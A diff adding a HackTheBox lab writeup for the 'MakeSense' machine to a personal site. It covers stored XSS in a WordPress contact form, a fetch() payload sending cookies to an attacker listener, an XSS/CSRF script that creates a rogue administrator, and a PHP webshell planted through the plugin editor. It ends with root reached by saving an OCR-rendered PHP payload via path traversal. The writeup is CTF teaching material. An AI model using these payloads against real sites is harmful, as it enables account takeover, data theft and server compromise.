@@ -6,77 +6,312 @@
     <title>MakeSense • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB MakeSense</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Platform:</strong> HackTheBox</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>OS:</strong> Linux</span>
+        <span><strong>IP:</strong> $TARGET</span>
+        <span><strong>Domain:</strong> makesense.htb</span>
+        <span><strong>Tech Stack:</strong> Apache 2.4.58, WordPress 7.0, MySQL, PHP built-in dev server (root), Pillow/OCR service</span>
     </div>
+
+    <h1>MakeSense — HackTheBox Writeup</h1>
+
+    <h2>🗺️ Attack Chain Overview</h2>
+    <div class="attack-chain">WordPress stored XSS (contact form) → cookie exfiltration
+   → Upload dir fuzzing → voice message WAV file
+   → Whisper transcription → jake:ClearLightNiceSmooth4923
+   → XSS + CSRF → create admin user via admin's authenticated session
+   → WordPress plugin editor → PHP webshell → www-data shell
+   → wp-config.php → walter:JbhHDAEgXvri3! → SSH as walter
+   → ss/ps → PHP dev server on 127.0.0.1:8001 running as root (/root/ocr4/)
+   → SSH port forward → OCR submit PHP payload image → save as .php
+   → RCE as root via /root/ocr4/saved/shell.php</div>
+
+    <h2>📋 Table of Contents</h2>
+    <ul>
+        <li><a href="#reconnaissance" style="color: #6fffe0;">1. Reconnaissance</a></li>
+        <li><a href="#wordpress-scan" style="color: #6fffe0;">2. WordPress Scan</a></li>
+        <li><a href="#stored-xss" style="color: #6fffe0;">3. Stored XSS via Contact Form</a></li>
+        <li><a href="#voice-message" style="color: #6fffe0;">4. Voice Message Discovery and Credential Extraction</a></li>
+        <li><a href="#xss-admin" style="color: #6fffe0;">5. XSS-Driven Admin User Creation</a></li>
+        <li><a href="#rce-plugin" style="color: #6fffe0;">6. RCE via WordPress Plugin Editor</a></li>
+        <li><a href="#db-ssh" style="color: #6fffe0;">7. DB Credentials and SSH as walter</a></li>
+        <li><a href="#privilege-escalation" style="color: #6fffe0;">8. Privilege Escalation — OCR Service Path Traversal</a></li>
+        <li><a href="#root-flag" style="color: #6fffe0;">9. Root Flag</a></li>
+        <li><a href="#key-takeaways" style="color: #6fffe0;">10. Key Takeaways</a></li>
+    </ul>
+
+    <h2 id="reconnaissance">🔍 1. Reconnaissance</h2>
+    <pre><code>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
+nmap -sVC -p22,443 $TARGET -oN service</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
+|_http-generator: WordPress 7.0
+|_http-title: Agency LLC
+| ssl-cert: Subject: commonName=makesense.htb</code></pre>
+
+    <p>Add vhost:</p>
+    <pre><code>echo "$TARGET makesense.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <p>Only HTTPS (port 443). WordPress 7.0 on Apache with a self-signed cert. All subsequent requests need <code>-k</code> (ignore TLS warnings).</p>
+
+    <h2 id="wordpress-scan">📊 2. WordPress Scan</h2>
+    <pre><code>wpscan --url https://makesense.htb
+wpscan --url https://makesense.htb --enumerate p --plugins-detection aggressive
+wpscan --url https://makesense.htb --enumerate u --disable-tls-checks</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>[+] akismet
+ | Location: https://makesense.htb/wp-content/plugins/akismet/
+ | Latest Version: 5.7
+-------------------------------------------
+[+] Users: admin, walter, jake
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre>
+
+    <p>Discovered three users: <code>admin</code>, <code>walter</code>, <code>jake</code>. No immediately exploitable plugins, so moved on to application-level attack surfaces.</p>
+
+    <h2 id="stored-xss">💉 3. Stored XSS via Contact Form</h2>
+    <p>The site has a contact form that accepts a name, email, phone, and message. Tested for stored XSS — injected a fetch payload that would exfiltrate cookies when an admin reviewed the submission:</p>
+
+    <pre><code>sudo ncat -lvnp 80 --keep-open --no-shutdown
+
+curl -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "action=submit_contact_form" \
+  --data-urlencode "nonce=9e39546208" \
+  --data-urlencode "name=<script>fetch('http://10.10.15.26/name?'+document.cookie)</script>" \
+  --data-urlencode "email=test@test.com" \
+  --data-urlencode "phone=123456" \
+  --data-urlencode "message=<script>fetch('http://10.10.15.26/message?'+document.cookie)</script>" -k</code></pre>
+
+    <p>The callback returned <code>wp-settings-time-3=1783425209</code> — a non-auth cookie (settings preferences, not a session token). Useful for fingerprinting that the admin reviewed the message, but not sufficient for hijacking the admin session directly.</p>
+
+    <div class="box warning">
+        <p><strong>Why we kept going with XSS anyway:</strong> if we could make the admin's browser perform authenticated actions on our behalf (CSRF-style via fetch), we didn't need the raw session cookie.</p>
+    </div>
+
+    <h2 id="voice-message">🎙️ 4. Voice Message Discovery and Credential Extraction</h2>
+    <p>Fuzzing the upload directory revealed a WAV file:</p>
+    <pre><code>https://makesense.htb/wp-content/uploads/2026/01/</code></pre>
+
+    <p>The uploads directory contained <code>.wav</code> voice messages. One was a recording of <code>jake</code> testing a new feature — he accidentally said his password aloud.</p>
+
+    <p>Transcribed with Whisper:</p>
+    <pre><code>whisper voice-message.wav --model tiny --language en</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>[00:00.000 --> 00:05.080]  Hey this is Jake, I'm testing the new feature, and it's neck-siding, I'm going near
+[00:05.080 --> 00:13.360]  Oops, lug in, thumb, Jake, clear, light, nice, smooth, four, nice, two, three.</code></pre>
+
+    <p>Parsing the transcription: "log in … Jake … clear, light, nice, smooth, four, nine, two, three" → <code>ClearLightNiceSmooth4923</code></p>
+
+    <div class="box success">
+        <pre><code>Username: jake
+Password: ClearLightNiceSmooth4923</code></pre>
+    </div>
+
+    <h2 id="xss-admin">🔓 5. XSS-Driven Admin User Creation</h2>
+    <p>Logged in as <code>jake</code> but his role lacked the permissions needed to install plugins or edit themes. We needed admin access.</p>
+
+    <p>The stored XSS was still active — any time an admin reviewed the contact form messages, our JavaScript executed in their browser in an authenticated context. We leveraged this to have the admin's browser create a new administrator account via a CSRF-style fetch chain:</p>
+
+    <pre><code>&lt;script&gt;
+fetch('/wp-admin/user-new.php')
+  .then(r => r.text())
+  .then(html => {
+    const match = html.match(/name="_wpnonce_create-user" value="([^"]+)"/);
+    if (match) {
+      const nonce = match[1];
+      fetch('/wp-admin/user-new.php', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'action=createuser&_wpnonce_create-user=' + nonce +
+              '&user_login=hacker&email=hacker@test.com&pass1=Hacker123!&pass2=Hacker123!&role=administrator'
+      }).then(r => {
+        fetch('http://10.10.15.26/created?status=' + r.status);
+      });
+    }
+  });
+&lt;/script&gt;</code></pre>
+
+    <p><strong>Output on our listener:</strong></p>
+    <pre><code>GET /created?status=200 HTTP/1.1</code></pre>
+
+    <p>We now had full WordPress admin access as <code>hacker:Hacker123!</code>.</p>
+
+    <div class="box warning">
+        <p><strong>Why this works:</strong> the fetch call runs in the admin's browser with their active session. The two-step nonce extraction + POST mirrors exactly what a human admin would do in the UI — WordPress's CSRF protection (the nonce) is bypassed because we read it from the DOM first.</p>
+    </div>
+
+    <h2 id="rce-plugin">⚡ 6. RCE via WordPress Plugin Editor</h2>
+    <p>With admin access, navigated to <strong>Plugins → Plugin File Editor</strong> and selected the Akismet plugin. Injected a PHP webshell into its <code>header.php</code> (or any other file that gets included on page load):</p>
+
+    <pre><code>if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+    exit;
+}</code></pre>
+
+    <p>Verified RCE:</p>
+    <pre><code>curl -s -k "https://makesense.htb/?cmd=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+    <h2 id="db-ssh">🗄️ 7. DB Credentials and SSH as walter</h2>
+    <p>Read <code>wp-config.php</code> via the webshell:</p>
+    <pre><code>curl -k "https://makesense.htb/?cmd=cat%20wp-config.php"</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'walter' );
+define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
+define( 'DB_HOST', 'localhost' );</code></pre>
+
+    <p>Walter's DB password was reused for his SSH account:</p>
+    <pre><code>ssh walter@$TARGET
+# password: JbhHDAEgXvri3!
+cat /home/walter/user.txt</code></pre>
+
+    <div class="box success">
+        <p><strong>User flag captured.</strong></p>
+    </div>
+
+    <h2 id="privilege-escalation">⬆️ 8. Privilege Escalation — OCR Service Path Traversal</h2>
+
+    <h3>Discovering the Root Process</h3>
+    <pre><code>ps aux | grep -v grep | grep -i root</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>root  1361  /bin/bash /root/.scripts/start_ocr4.sh
+root  1405  php -S 127.0.0.1:8001 -t /root/ocr4/</code></pre>
+
+    <div class="box warning">
+        <p>A PHP built-in dev server was running as <strong>root</strong>, serving files from <code>/root/ocr4/</code> on localhost only. PHP dev servers spawned without a router script will serve any <code>.php</code> file statically — if we can write a PHP file into the webroot, we get RCE as root.</p>
+    </div>
+
+    <h3>Port Forwarding to the OCR Service</h3>
+    <pre><code>ssh -L 8001:127.0.0.1:8001 walter@$TARGET -N -f</code></pre>
+
+    <p>The OCR service uses HTTP Basic Auth reusing walter's credentials:</p>
+    <pre><code>curl -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/</code></pre>
+
+    <h3>Understanding the OCR Application</h3>
+    <p>The app is a canvas-based handwriting recognizer:</p>
+    <ol>
+        <li>The user draws on an HTML5 <code>&lt;canvas&gt;</code>.</li>
+        <li><code>sendCanvas()</code> serializes the canvas to a PNG (<code>canvas.toDataURL('image/png')</code>) and POSTs it as <code>canvas_image</code>.</li>
+        <li>The backend runs OCR on the image and returns recognized text along with an <code>ocr_id</code> (e.g. <code>ocr_6a4d05a918c5c6.85274710</code>), bound to the PHP session.</li>
+        <li>A second form lets you POST <code>ocr_id</code>, <code>filename</code>, and <code>save_output</code> to <strong>save the recognized text to a file</strong> under <code>saved/</code> inside the webroot.</li>
+    </ol>
+
+    <div class="box danger">
+        <p><strong>Attack primitive:</strong> if we can get the OCR engine to recognize a valid PHP payload and then save it with a <code>.php</code> extension inside the webroot, the PHP dev server will execute it as root.</p>
+    </div>
+
+    <h3>Generating a Clean Payload Image</h3>
+    <pre><code>#!/usr/bin/env python3
+from PIL import Image, ImageDraw, ImageFont
+
+text = "&lt;?php system($_GET['cmd']); ?&gt;"
+
+img = Image.new('RGB', (900, 200), color='white')
+draw = ImageDraw.Draw(img)
+
+font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 32)
+draw.text((20, 70), text, fill='black', font=font)
+img.save('payload.png')</code></pre>
+
+    <p>Convert to a data URI (as expected by the canvas form):</p>
+    <pre><code>echo -n "data:image/png;base64,$(base64 -w0 payload.png)" > payload_b64.txt</code></pre>
+
+    <h3>Step 1 — Submit the Image for OCR</h3>
+    <div class="box warning">
+        <p>The <code>ocr_id</code> is bound to the PHP session (<code>PHPSESSID</code> cookie). Both the OCR submission and the save request must share the same session or the save will fail with <code>Invalid OCR request. Cannot save.</code> — use a cookie jar (<code>-c</code>/<code>-b</code>) for both requests.</p>
+    </div>
+
+    <pre><code>curl -s -u walter:JbhHDAEgXvri3! -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
+  --data-urlencode "canvas_image@payload_b64.txt" -o step1.html</code></pre>
+
+    <p>The OCR recognized the payload exactly:</p>
+    <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+    <h3>Step 2 — Save with Path Traversal</h3>
+    <pre><code>OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' step1.html)
+echo "[+] OCR ID: $OCR_ID"
+
+curl -s -u walter:JbhHDAEgXvri3! -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
+  --data-urlencode "ocr_id=$OCR_ID" \
+  --data-urlencode "filename=../shell.php" \
+  --data-urlencode "save_output=" -o step2.html
+
+grep -E "notice|error|success" step2.html</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>[+] OCR ID: ocr_6a4d06c7208308.89727194
+&lt;p class="notice success reveal"&gt;Saved as: saved/shell.php&lt;/p&gt;</code></pre>
+
+    <h3>Root RCE</h3>
+    <pre><code>curl -s -u walter:JbhHDAEgXvri3! "http://127.0.0.1:8001/saved/shell.php?cmd=id"
+# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+    <h2 id="root-flag">👑 9. Root Flag</h2>
+    <pre><code>curl -s -G "http://127.0.0.1:8001/saved/shell.php" -u walter:JbhHDAEgXvri3! \
+  --data-urlencode "cmd=cat /root/root.txt"</code></pre>
+
+    <div class="box success">
+        <p><strong>Root flag captured.</strong></p>
+    </div>
+
+    <h2 id="key-takeaways">🧠 10. Key Takeaways</h2>
+    <ul>
+        <li><strong>Stored XSS without session cookies is still powerful.</strong> Even when the exfiltrated cookies are non-auth preference cookies, the admin's authenticated browser context can perform state-changing actions via <code>fetch()</code> + nonce extraction — classic XSS-to-CSRF chaining.</li>
+        <li><strong>WAV files in upload directories contain secrets.</strong> Audio/voice message files in web uploads are routinely overlooked. Whisper makes transcription trivial even on CPU with the <code>tiny</code> model.</li>
+        <li><strong>Root-owned PHP dev servers are a common privesc path.</strong> <code>php -S</code> run by root as a convenience daemon creates a trivially exploitable webshell-write-to-root-RCE path. <code>ps aux | grep -i root</code> and <code>ss -tulpn</code> should always be your first two post-foothold commands.</li>
+        <li><strong>OCR sessions are stateful.</strong> The <code>ocr_id</code> binding to <code>PHPSESSID</code> is a gotcha — if you switch curl sessions between the submit and save steps you'll get a cryptic "Invalid OCR request" error. Always persist cookies with <code>-c</code>/<code>-b</code>.</li>
+        <li><strong>Generate payload images programmatically.</strong> Using Pillow + a monospace font to render the payload as an image is orders of magnitude more reliable than hand-drawing on a canvas and hoping the OCR recognizes it correctly.</li>
+        <li><strong>Password reuse from wp-config.php → SSH.</strong> Always try DB usernames and passwords directly against SSH, sudo, and any other login surface before doing any further enumeration.</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
